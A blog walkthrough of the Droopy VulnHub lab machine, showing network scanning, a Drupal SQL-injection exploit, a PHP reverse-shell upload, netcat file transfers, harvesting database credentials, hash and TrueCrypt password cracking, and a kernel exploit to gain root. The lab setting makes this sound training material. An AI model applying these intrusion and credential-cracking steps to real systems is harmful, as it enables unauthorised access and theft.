---
layout: post
title: Walkthrough Droopy
date: 2016-05-01 22:35:02.000000000 -03:00
type: post
published: true
status: publish
categories: []
tags:
- CTF
- pen-testing
- vulnhub
- wargames
meta:
  _oembed_295f2e401072a55fcfde7d157936cd11: "{{unknown}}"
  _oembed_f8e496b4490ca169a2aac8e66bf1a203: "{{unknown}}"
  _oembed_223cb67f08e4fe58d2fb14513567afec: "{{unknown}}"
  _oembed_00ea6fc5c32fc718ffb114e79fa4bb44: "{{unknown}}"
  _oembed_be22842c45f68892efb37cb3ce72109c: "<div class=\"embed-exploitsdatabase\"><blockquote
    class=\"wp-embedded-content\"><a href=\"https://www.exploit-db.com/search/\">Search
    the Exploit Database</blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--\t\t!function(a,b){\"use
    strict\";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf(\"MSIE
    10\"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll(\"iframe.wp-embedded-content\");for(c=0;c<i.length;c++)if(d=i[c],!d.getAttribute(\"data-secret\")){if(f=Math.random().toString(36).substr(2,10),d.src+=\"#?secret=\"+f,d.setAttribute(\"data-secret\",f),g||h)a=d.cloneNode(!0),a.removeAttribute(\"security\"),d.parentNode.replaceChild(a,d)}else;}}var
    d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var
    d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var
    e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret=\"'+d.secret+'\"]'),k=b.querySelectorAll('blockquote[data-secret=\"'+d.secret+'\"]');for(e=0;e<k.length;e++)k[e].style.display=\"none\";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.removeAttribute(\"style\"),\"height\"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else
    if(200>~~g)g=200;f.height=g}if(\"link\"===d.message)if(h=b.createElement(\"a\"),i=b.createElement(\"a\"),h.href=f.getAttribute(\"src\"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener(\"message\",a.wp.receiveEmbedMessage,!1),b.addEventListener(\"DOMContentLoaded\",c,!1),a.addEventListener(\"load\",c,!1)}(window,document);//--><!]]></script><iframe
    sandbox=\"allow-scripts\" security=\"restricted\" src=\"https://www.exploit-db.com/search/embed/\"
    width=\"600\" height=\"338\" title=\"&#8220;Search the Exploit Database&#8221;
    &#8212; Exploits Database\" frameborder=\"0\" marginwidth=\"0\" marginheight=\"0\"
    scrolling=\"no\" class=\"wp-embedded-content\"></iframe></div>"
  _oembed_time_be22842c45f68892efb37cb3ce72109c: '1462134065'
  _oembed_df45a48439dc71930ccaf11861942bd3: "{{unknown}}"
  _oembed_31ded274867777d600b678c4b2176981: "{{unknown}}"
  _oembed_8ad5f0513a256f316989467f400ebf65: "{{unknown}}"
  _oembed_9f600c7782fc7f1ec59c72fac24326cc: "{{unknown}}"
  _rest_api_published: '1'
  _rest_api_client_id: "-1"
  _publicize_job_id: '22375197352'
  _oembed_d5f4193a18ac99236fabf8920d85a6dd: "{{unknown}}"
  _oembed_919903d6cb9c08261a76e425fe9c3935: "{{unknown}}"
  _oembed_b4b5f7d85f32dc49a3365fca185bafb2: "{{unknown}}"
  _oembed_87d1b49d81ebb2c811934a599d3d17ea: "{{unknown}}"
  _oembed_64019a5346e854f76835aa545c3fe9f1: "{{unknown}}"
  _oembed_4375bb139f28bb1d087c0d2dd0e3f5e6: "{{unknown}}"
  _oembed_dbd8d2a1485473beb215b5de524fa75b: "{{unknown}}"
  _oembed_09804befbd6fffe19ce1e9f037b5510b: "{{unknown}}"
author:
  login: tidlost
  email: tl.dr.mfw@gmail.com
  display_name: tidlost
  first_name: ''
  last_name: ''
---

Another walkthrough. This time for the Droopy-vm. It can be found here on [vulnhub.com](https://www.vulnhub.com/entry/droopy-v02,143/)
I tried out netdiscover, just to learn something new. I have seen that other people use it. It turns out that it works to find hosts on the network. It works by sending out ARP-requests throughout the network and loggin the requests. I am not really sure if nmap is using a different technique. But it is good to know that there is an alternative to nmap for it.

```bash
netdiscover -r 192.168.1.0/24
 Currently scanning: Finished!   |   Screen View: Unique
Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.1.1     e8:de:27:31:15:ee      1      60  TP-LINK TECHNOLOGIES CO.,LTD.
 192.168.1.104   08:00:27:65:24:9c      1      60  Cadmus Computer Systems
```

So I ran nmap.

```bash
nmap -vvv -A -T4 -O 192.168.1.104
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
MAC Address: 08:00:27:65:24:9C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
```

First I thought that thie MD5 was a flag or something. But then I read that that is the standard way for nmap to output if it doesn't know the service.
The robots file is just filled with stuff.
Among the many files was this.
`http://droopy.dev/CHANGELOG.txt`
Where it said:
`Drupal 7.30, 2014-07-24`

This reminded me about a huge vulnerability that was in drupal a few years ago, that I had heard about.
I continued the scanning by running nikto and then checking out the info.php file to see what I could find.
This is some of all the info.

```
http://droopy.dev/info.php
PHP Version 5.5.9-1ubuntu4.5
Hostname:Port droopy.knight139.co.uk:80
User/Group www-data(33)/33
Apache Version Apache/2.4.7 (Ubuntu)
Loaded Modules core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php5 mod_rewrite mod_setenvif mod_status
DOCUMENT_ROOT /var/www/html
SERVER_ADMIN webmaster@localhost
Mysql
Client API version 5.5.40
PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

The default apache-page was also found.
http://droopy.dev/index.html
I tried to brute-force the login. This made the server block my IP. And I also think I made it run out of memory or something. Because is subsequently crashed. Great. So I restarted the VM fresh again. And this time I checked out the drupal-exploit.
So I searched for exploits on the [exploits-database.](https://www.exploit-db.com/search/?order_by=date&order=desc&pg=1&action=search&description=Drupal)

There I found four exploits that are called something along the lines of: Drupal Core <= 7.32 - SQL Injection.

Or similar. Two were written in python two in php. I just picked one, and downloaded it and ran it. Which was pretty stupid, because I created, by default in the exploit, a user with the username admin. So I overwrote the original user.

So once I later gained access, and checked in the database. I only found my own user. Otherwise I would have been able to crack the hash of the original user and that password could have been good to know.

Anyhow, I gained access and after some googeling I figured out how to allow php in drupal (modules/php-filter). And I uploaded the php-reverse-shell.ph that I found here:
usr/share/laudanum/php/php-reverse-shell.php

## Privilege escalation
Now I had shell for user: www-data. So I went to /tmp and started netcat to transfer my enumeration-file.

```
nc -lvp 3333 > enum.sh
```

Then I sent the file with:

```
nc 192.168.1.104 3333 < enum.sh
```

Then: chmod +x enum.sh
Among other things I found:

```bash
uid=1000(gsuser) gid=1000(gsuser) groups=1000(gsuser),24(cdrom),30(dip),46(plugdev),110(lpadmin
hostname is:
HOSTNAME=dhcppc5
# In the hosts file I find this.
127.0.1.1	droopy.knight139.co.uk	droopy
```

I remembered that every web-server that runs mysql has the logins for it in some file. So after some snooping-around I found the file:

```
/var/www/html/sites/default
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'nimda',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

So I log in to mysql.

```
mysql -u drupaluser -p drupal
password: nimda
SHOW tables;
mysql> SELECT * FROM users;
SELECT * FROM users;
$S$DLx/ePXpg18r5tnZs8aHkngNTWpyjyMLvPvC0gdaEjo4agY8Iyym
```

So I went here: http://www.onlinehashcrack.com/hash-identification.php#res
To identify what type of hash it was.
It turns out it is a SHA-512.
- SHA-512(Drupal)
I study the commands of hashcat and found this:

```
hashcat -m 7900 -a 0 -o found.txt admin.hash /usr/share/hashcat/rules/rockyou-30000.rule
```

7900 is the drupal-mode.
Meanwhile I continue to look around and found an email in /var/spool/mail:

```
From Dave <dave@droopy.example.com> Wed Thu 14 Apr 04:34:39 2016
Date: 14 Apr 2016 04:34:39 +0100
From: Dave <dave@droopy.example.com>
Subject: rockyou with a nice hat!
Message-ID: <730262568@example.com>
X-IMAP: 0080081351 0000002016
Status: NN
George,
   I've updated the encrypted file... You didn't leave any
hints for me. The password isn't longer than 11 characters
and anyway, we know what academy we went to, don't you...?
I'm sure you'll figure it out it won't rockyou too much!
If you are still struggling, remember that song by The Jam
Later,
Dave
```

Okay, so it talks about an encrypted file. From a guy named Dave.
It looks like the encrypted file can be decrypted with a password that is found in the rockyou dictionary.
We also know that the password is less than 11 characters, and it has something to do with an academy.
And it is also the name of a song by the Jam.
So I started listening to some songs by The Jam a start looking for the encrypted file. But I couldn't really find anything useful.
After some minor cheating I learn that it is a good idea to look for privilege-escalation exploits. So I search exploit-database again and find several exploits. I download this one: https://www.exploit-db.com/exploits/37292/
Transfered it over to the VM with nc. Then gcc, chmod and execute, and now I am root. BOOM! Fast when stuff just works.
In /root i found a file called dave.tc.
After some googeling I found out that .tc probably is a true-crypt file. And after some more googeling I learned that there is a program called truecrack.
After a lot of struggling I found that with sed we can remove all words in our dictionary that are shorter than 11 characters.
I did it with this command.
The -i flag is important. It makes the changes in the current file. Without it nothing happens. As I learned.

```
sed -i -r '/^.{0,10}$/d' rr.txt
```

So now we have a list with 1.8 millions.
wc -l rr.txt
1879453 rr.txt
Then I did
grep acade rr.txt > rr2.txt
To get all words containing the work academy. As it was mentioned in the email.
Then again:

```
truecrack -t dave.tc -k sha512 -b 8 -w rr2.txt -v
Found password:		"etonacademy"
Password length:	"12"
```

On this page I learned how to mount a truecrypt-volume. So I did that.
https://tails.boum.org/doc/encryption_and_privacy/truecrypt/index.en.html

```
mkdir /media/dave
mount /dev/mapper/dave /media/dave
ls /media/dave/
buller  lost+found  panama
```

In the buller dir there is a file called bullingdon-crest.
https://en.wikipedia.org/wiki/Bullingdon_Club
Now I get it. The Dave character is David Cameron. And I guess the shares.jpg refers to his corrupt family's holdings in off-shore banks. And the pig in .secret is of course the infamous pig he most likely fucked. And in the .top dir is the flag. Pretty clever ending to a great VM!
## Conclusion
So on this VM I really learned a lot!
The most important thing I think was: always check the exploit-database!
All it really took was to search for two exploits to gain root. First to enter drupal-admin and then to elevate to root.
I really liked it because it felt very real. The drupal and priv-escalation exploits are both very real. Thanks to knightmare for a great VM!
